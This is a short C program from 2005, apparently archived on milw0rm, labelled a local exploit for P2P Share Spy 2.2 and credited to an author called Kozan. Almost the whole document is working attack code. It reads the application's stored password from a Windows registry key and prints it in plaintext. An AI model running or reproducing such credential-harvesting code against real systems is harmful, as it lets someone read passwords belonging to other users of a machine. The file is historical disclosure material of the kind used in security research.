/*****************************************************************

P2P Share Spy 2.2 Local Exploit by Kozan

Application: P2P Share Spy 2.2
Vendor: Rebrand Software - www.rebrandsoftware.com
Vulnerable Description: P2P Share Spy 2.2 discloses passwords
to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*****************************************************************/

#include <stdio.h>
#include <windows.h>

#define BUFSIZE 100
HKEY hKey;
char Password[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

int main(void)
{

       if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\VB and VBA Program Settings\\P2P Share Spy\\Settings",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey) == ERROR_SUCCESS)
       {

           lRet = RegQueryValueEx( hKey, "txtPassword", NULL, NULL,(LPBYTE) Password, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf("Not found!");
                                return 0;
                       }

                               RegCloseKey( hKey );

                       printf("P2P Share Spy 2.2 Local Exploit by Kozan\n");
                       printf("Credits to ATmaCA\n");
                       printf("www.netmagister.com  -  www.spyinstructors.com\n");
                       printf("kozan@netmagister.com\n\n");
                       printf("Program Opening Password : %s\n",Password);

        }
        else{
                printf("P2P Share Spy 2.2 is not installed on your system!\n");
        }

       return 0;
}

// milw0rm.com [2005-04-07]